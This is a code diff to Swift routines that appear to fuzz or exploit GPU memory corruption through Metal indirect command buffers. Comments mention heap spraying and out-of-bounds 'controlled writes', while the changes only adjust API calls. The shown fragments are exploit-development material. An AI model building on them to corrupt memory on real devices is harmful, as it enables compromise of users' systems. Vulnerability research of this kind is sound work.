@@ -641,7 +641,7 @@ func runICBCorruptFuzz(log: FuzzLog, completion: @escaping () -> Void) {
         enc.useResource(icbBuf,    usage: .read)
         enc.useResource(dataBuf,   usage: .write)
         enc.useResource(targetBuf, usage: .write)
-        enc.executeCommandsInBuffer(icb, range: 0..<1)
+        enc.executeCommandsInBuffer(icb, range: NSRange(location: 0, length: 1))
         enc.endEncoding()
         sl.write("CONTROLLED WRITE — committing ICB execute")
         cmd.addCompletedHandler { [pTarget, targetBuf] cb in
@@ -2654,17 +2654,10 @@ func runICBCorruption(log: FuzzLog, completion: @escaping () -> Void) {
         step("ICB resourceID=0x\(String(icb.gpuResourceID._impl, radix: 16))")
 
         // Encode slot 0: 1-vertex point draw, sentinelBuf as vtxBuf[0]
-        var drawArgs = MTLDrawPrimitivesIndirectArguments(
-            vertexCount: 1, instanceCount: 1, vertexStart: 0, baseInstance: 0)
-        guard let drawArgsBuf = device.makeBuffer(bytes: &drawArgs,
-                                                   length: MemoryLayout<MTLDrawPrimitivesIndirectArguments>.size,
-                                                   options: .storageModeShared) else {
-            step("✗ drawArgs alloc failed"); completion(); return
-        }
         let slot = icb.indirectRenderCommandAt(0)
         slot.setRenderPipelineState(pso)
         slot.setVertexBuffer(sentinelBuf, offset: 0, at: 0)
-        slot.drawPrimitives(type: .point, indirectArguments: drawArgsBuf, indirectArgumentsOffset: 0)
+        slot.drawPrimitives(type: .point, vertexStart: 0, vertexCount: 1, instanceCount: 1, baseInstance: 0)
         step("ICB slot 0 encoded: vtxBuf[0]=sentinelBuf, 1 point draw")
 
         // Spray GPU-adjacent pairs — OOB write target VA into hi buf
@@ -2707,7 +2700,7 @@ func runICBCorruption(log: FuzzLog, completion: @escaping () -> Void) {
 
         guard let cb  = queue.makeCommandBuffer()                      else { step("✗ no cmd buf"); completion(); return }
         guard let enc = cb.makeRenderCommandEncoder(descriptor: rtDesc) else { step("✗ no encoder"); completion(); return }
-        enc.executeCommandsInBuffer(icb, range: 0..<1)
+        enc.executeCommandsInBuffer(icb, range: NSRange(location: 0, length: 1))
         enc.endEncoding()
         cb.addCompletedHandler { buf in
             if let err = buf.error {
